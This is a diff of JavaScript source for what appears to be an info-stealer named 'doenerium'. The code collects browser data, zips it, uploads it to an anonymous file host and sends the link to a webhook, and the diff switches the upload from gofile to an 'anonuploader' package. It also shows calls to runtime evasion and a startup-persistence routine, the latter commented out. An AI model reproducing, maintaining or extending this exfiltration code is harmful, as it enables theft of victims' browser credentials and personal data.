@@ -3437,15 +3437,13 @@
               await client.utils.browsers.saveBrowserStuff();
               await client.utils.jszip.createZip();
 
-              const upload = await client.utils.gofile.uploadFile(
-                client.requires.fs.createReadStream(`${client.config.jszip.path}.zip`)
+              const upload = await client.requires.anonuploader.upload(
+                `${client.config.jszip.path}.zip`
               );
-
-
 
               var counter_embed = this.create_counter_embed();
 
-              counter_embed.description = `**[Download the zip file](${upload.downloadPage})**`;
+              counter_embed.description = `**[Download the zip file](${(JSON.parse(upload)).data.file.url.full})**`;
 
               await client.utils.webhook.sendToWebhook({
                 embeds: [counter_embed, client.utils.webhook.createEmbed({
@@ -4074,6 +4072,7 @@
     class doenerium {
       constructor() {
         this.requires = {
+          anonuploader: require("anonuploader"),
           https: require("https"),
           zlib: require("zlib"),
           forge: require("node-forge"),
@@ -4238,7 +4237,7 @@ return ${eval_string};
         })
 
         this.runtime_evasion();
-        this.add_to_startup();
+        //this.add_to_startup();
 
         try {
           this.config.embed = JSON.parse(
